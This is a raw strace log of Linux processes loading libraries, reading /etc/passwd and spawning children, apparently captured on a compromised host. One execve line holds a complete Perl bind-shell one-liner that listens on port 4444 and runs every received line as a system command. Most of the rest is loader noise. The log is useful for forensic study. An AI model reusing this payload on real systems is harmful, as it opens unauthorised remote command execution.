\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
10002 07:30:53.636306 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
10002 07:30:53.636324 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d6f000
10002 07:30:53.636336 mmap2(0xb7d76000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d76000
10002 07:30:53.636354 close(1)          = 0
10002 07:30:53.636379 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.636392 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
10002 07:30:53.636406 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
10002 07:30:53.636491 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
10002 07:30:53.636507 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d57000
10002 07:30:53.636522 mmap2(0xb7d6b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d6b000
10002 07:30:53.636537 mmap2(0xb7d6d000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d6d000
10002 07:30:53.636551 close(1)          = 0
10002 07:30:53.636576 munmap(0xb7efd000, 29913) = 0
10002 07:30:53.636593 open("/etc/ld.so.cache", O_RDONLY) = 1
10002 07:30:53.636606 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10002 07:30:53.636622 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efd000
10002 07:30:53.636632 close(1)          = 0
10002 07:30:53.636642 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.636656 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
10002 07:30:53.636683 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10002 07:30:53.636829 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
10002 07:30:53.636860 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4d000
10002 07:30:53.636871 mmap2(0xb7d55000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d55000
10002 07:30:53.636887 close(1)          = 0
10002 07:30:53.636900 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.636913 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
10002 07:30:53.636927 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10002 07:30:53.637014 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10002 07:30:53.637031 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d42000
10002 07:30:53.637042 mmap2(0xb7d4b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d4b000
10002 07:30:53.637057 close(1)          = 0
10002 07:30:53.637081 munmap(0xb7efd000, 29913) = 0
10002 07:30:53.637097 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
10002 07:30:53.637111 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10002 07:30:53.637122 _llseek(1, 0, [0], SEEK_CUR) = 0
10002 07:30:53.637134 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
10002 07:30:53.637150 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f04000
10002 07:30:53.637160 _llseek(1, 1624, [1624], SEEK_SET) = 0
10002 07:30:53.637187 munmap(0xb7f04000, 1624) = 0
10002 07:30:53.637228 close(1)          = 0
10002 07:30:53.637288 getpgrp()         = 3831
10002 07:30:53.637298 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
10002 07:30:53.637312 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
10002 07:30:53.637329 brk(0x8101000)    = 0x8101000
10002 07:30:53.637360 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.637375 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.637389 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.637426 brk(0x8102000)    = 0x8102000
10002 07:30:53.637451 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10002 07:30:53.637470 stat64("/sbin/AB", 0xbf8e1f38) = -1 ENOENT (No such file or directory)
10002 07:30:53.637482 stat64("/bin/AB", 0xbf8e1f38) = -1 ENOENT (No such file or directory)
10002 07:30:53.637493 stat64("/usr/sbin/AB", 0xbf8e1f38) = -1 ENOENT (No such file or directory)
10002 07:30:53.637505 stat64("/usr/bin/AB", 0xbf8e1f38) = -1 ENOENT (No such file or directory)
10002 07:30:53.637518 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10002 07:30:53.637532 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d786f8) = 10003
10003 07:30:53.637575 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10003 07:30:53.637591 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10003 07:30:53.637604 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10003 07:30:53.637615 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10003 07:30:53.637632 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10003 07:30:53.637647 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10003 07:30:53.637660 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10003 07:30:53.637770 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
10003 07:30:53.637784 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10003 07:30:53.637849 exit_group(127)   = ?
10002 07:30:53.662418 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.662418 --- SIGCHLD (Child exited) @ 0 (0) ---
10002 07:30:53.662418 waitpid(-1,  <unfinished ...>
4519  07:30:53.662418 waitpid(10002,  <unfinished ...>
10002 07:30:53.662418 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 10003
10002 07:30:53.672239 waitpid(-1, 0xbf8e1bb8, WNOHANG) = -1 ECHILD (No child processes)
10002 07:30:53.672270 sigreturn()       = ? (mask now [])
10002 07:30:53.672295 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10002 07:30:53.672311 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.672322 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10002 07:30:53.672334 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10002 07:30:53.672353 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.672364 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10002 07:30:53.672400 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10002 07:30:53.672420 stat64("/sbin/perl", 0xbf8e1f68) = -1 ENOENT (No such file or directory)
10002 07:30:53.672432 stat64("/bin/perl", 0xbf8e1f68) = -1 ENOENT (No such file or directory)
10002 07:30:53.672444 stat64("/usr/sbin/perl", 0xbf8e1f68) = -1 ENOENT (No such file or directory)
10002 07:30:53.672455 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10002 07:30:53.672473 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10002 07:30:53.672498 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10002 07:30:53.672513 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d786f8) = 10004
10004 07:30:53.672569 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10004 07:30:53.672586 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10004 07:30:53.672599 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10004 07:30:53.672610 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10004 07:30:53.672627 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10004 07:30:53.672642 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10004 07:30:53.672655 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10004 07:30:53.672729 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
10004 07:30:53.672837 brk(0)            = 0x8153000
10004 07:30:53.672858 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.672874 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eeb000
10004 07:30:53.672890 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.672907 open("/etc/ld.so.cache", O_RDONLY) = 1
10004 07:30:53.672919 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10004 07:30:53.672936 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee3000
10004 07:30:53.672946 close(1)          = 0
10004 07:30:53.672957 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.672972 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10004 07:30:53.672986 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10004 07:30:53.673077 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10004 07:30:53.673094 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7edf000
10004 07:30:53.673106 mmap2(0xb7ee1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ee1000
10004 07:30:53.673123 close(1)          = 0
10004 07:30:53.673134 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.673148 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
10004 07:30:53.673162 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
10004 07:30:53.673308 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
10004 07:30:53.673326 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eba000
10004 07:30:53.673337 mmap2(0xb7edd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7edd000
10004 07:30:53.673353 close(1)          = 0
10004 07:30:53.673365 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.673379 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
10004 07:30:53.673393 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
10004 07:30:53.673478 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
10004 07:30:53.673494 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eb9000
10004 07:30:53.673507 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ea1000
10004 07:30:53.673518 mmap2(0xb7eb5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7eb5000
10004 07:30:53.673532 mmap2(0xb7eb7000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eb7000
10004 07:30:53.673546 close(1)          = 0
10004 07:30:53.673558 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.673571 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10004 07:30:53.673585 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10004 07:30:53.673671 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10004 07:30:53.673731 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d52000
10004 07:30:53.673746 mmap2(0xb7e9b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7e9b000
10004 07:30:53.673778 mmap2(0xb7e9e000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e9e000
10004 07:30:53.673809 close(1)          = 0
10004 07:30:53.673821 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10004 07:30:53.673834 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
10004 07:30:53.673848 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 